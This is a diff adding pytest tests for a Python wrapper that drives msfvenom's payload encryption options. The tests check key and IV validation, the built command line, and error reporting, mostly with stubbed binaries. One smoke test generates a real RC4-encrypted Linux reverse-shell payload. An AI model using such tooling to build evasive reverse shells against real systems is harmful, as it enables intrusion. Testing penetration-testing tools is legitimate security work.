@@ -289,6 +289,159 @@ def test_real_menu_rejects_bad_kind():
     assert "payloads" in r["error"]
 
 
+# --- encrypt/--encrypt lanes --------------------------------------------------
+# Box-independent: validation failures fire BEFORE any binary contact, but
+# generate_payload _locates_ msfvenom first, so tests here point MSFVENOM_BIN
+# at a harmless stub (validation never invokes it). argv/fail-parity tests
+# additionally fake subprocess.run. The real-binary smoke proves the
+# --encrypt wiring against a live msfvenom (kali) and skipif-skips elsewhere.
+
+
+def _stub_msfvenom(tmp_path, monkeypatch):
+    stub = tmp_path / "msfvenom-stub"
+    stub.write_text("#!/bin/sh\nexit 0\n")
+    stub.chmod(0o755)
+    monkeypatch.setenv("MSFVENOM_BIN", str(stub))
+
+
+def test_encrypt_method_validated(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1",
+        lport=4444, encrypt="rot 13"))
+    assert r["status"] == "Failed", r
+    assert "encrypt" in r["error"] and "msfvenom_menu" in r["error"], r
+
+
+def test_encrypt_requires_key_for_ciphers(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1",
+        lport=4444, encrypt="aes256"))
+    assert r["status"] == "Failed", r
+    assert "encrypt_key" in r["error"], r
+
+
+def test_encrypt_rejects_nonhex_key(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1",
+        lport=4444, encrypt="xor", encrypt_key="not-hex-bro"))
+    assert r["status"] == "Failed", r
+    assert "hex" in r["error"], r
+
+
+def test_encrypt_rejects_0x_prefix_iv(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1",
+        lport=4444, encrypt="aes256cbc", encrypt_key="aa" * 16,
+        encrypt_iv="0xaabbccdd"))
+    assert r["status"] == "Failed", r
+    assert "encrypt_iv" in r["error"], r
+
+
+def test_encrypt_iv_full_hex_validation(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1",
+        lport=4444, encrypt="aes256cbc", encrypt_key="aa" * 16,
+        encrypt_iv="zz"))
+    assert r["status"] == "Failed", r
+    assert "encrypt_iv" in r["error"] and "hex" in r["error"], r
+
+
+def test_encrypt_iv_without_key_rejected(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1",
+        lport=4444, encrypt="aes256cbc", encrypt_iv="aabbccdd"))
+    assert r["status"] == "Failed", r
+    assert "encrypt_key" in r["error"], r
+
+
+def test_encrypt_builds_correct_argv(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    recorded = {}
+
+    def fake_run(argv, **kwargs):
+        recorded["argv"] = argv
+        out = argv[argv.index("-o") + 1]
+        Path(out).write_bytes(b"\xcc\xdd\xee\xff" * 8)
+        return subprocess.CompletedProcess(argv, 0, stdout="Payload size: 32 bytes\n", stderr="")
+
+    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
+    monkeypatch.setattr(mv.subprocess, "run", fake_run)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="10.0.0.5", lport=9001,
+        out_name="enc.bin", encrypt="aes256cbc",
+        encrypt_key="aa" * 16, encrypt_iv="bb" * 8))
+    assert r["status"] == "Success", r
+    argv = recorded["argv"]
+    assert argv[argv.index("--encrypt") + 1] == "aes256cbc"
+    assert argv[argv.index("--encrypt-key") + 1] == "aa" * 16
+    assert argv[argv.index("--encrypt-iv") + 1] == "bb" * 8
+
+
+def test_encrypt_omitted_iv_not_in_argv(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+    recorded = {}
+
+    def fake_run(argv, **kwargs):
+        recorded["argv"] = argv
+        out = argv[argv.index("-o") + 1]
+        Path(out).write_bytes(b"A" * 4)
+        return subprocess.CompletedProcess(argv, 0, stdout="ok\n", stderr="")
+
+    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
+    monkeypatch.setattr(mv.subprocess, "run", fake_run)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1", lport=4444,
+        out_name="enc.bin", encrypt="rc4", encrypt_key="6b657973"))
+    assert r["status"] == "Success", r
+    argv = recorded["argv"]
+    assert "--encrypt" in argv and "--encrypt-key" in argv
+    assert "--encrypt-iv" not in argv
+
+
+_MSFVENOM_ERROR_42_SENTINEL = "MSFVENOM_ERROR_42_SENTINEL"
+
+
+def test_encrypt_fail_parity_surfaces_binary_error(tmp_path, monkeypatch):
+    _stub_msfvenom(tmp_path, monkeypatch)
+
+    def fake_run(argv, **kwargs):
+        return subprocess.CompletedProcess(
+            argv, 1, stdout="", stderr=_MSFVENOM_ERROR_42_SENTINEL)
+
+    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
+    monkeypatch.setattr(mv.subprocess, "run", fake_run)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1", lport=4444,
+        out_name="enc.bin", encrypt="rc4", encrypt_key="6b657973"))
+    assert r["status"] == "Failed", r
+    assert _MSFVENOM_ERROR_42_SENTINEL in r["error"], r
+    assert r["returncode"] == 1, r
+    # Existing module behavior: operator sees exactly what ran (argv echo),
+    # including the new encrypt flags.
+    assert "--encrypt rc4" in r["command"] and "--encrypt-key" in r["command"], r
+    assert not (tmp_path / "enc.bin").exists()
+
+
+def test_real_encrypt_rc4_raw_smoke(tmp_path, monkeypatch):
+    if not HAS_MSFVENOM:
+        import pytest
+        pytest.skip("msfvenom not installed")
+    monkeypatch.setattr(mv, "DROPBOX_DIR", tmp_path)
+    r = _run(mv.generate_payload(
+        payload="linux/x64/shell_reverse_tcp", lhost="127.0.0.1", lport=4444,
+        out_name="enc_smoke.bin", encrypt="rc4", encrypt_key="a1b2c3d4"))
+    assert r["status"] == "Success", r
+    blob = Path(r["out_path"]).read_bytes()
+    assert len(blob) == r["size_bytes"] > 0
+    assert "--encrypt" in r["command"]
+
+
 if __name__ == "__main__":
     passed = failed = 0
     for name, fn in sorted(globals().items()):
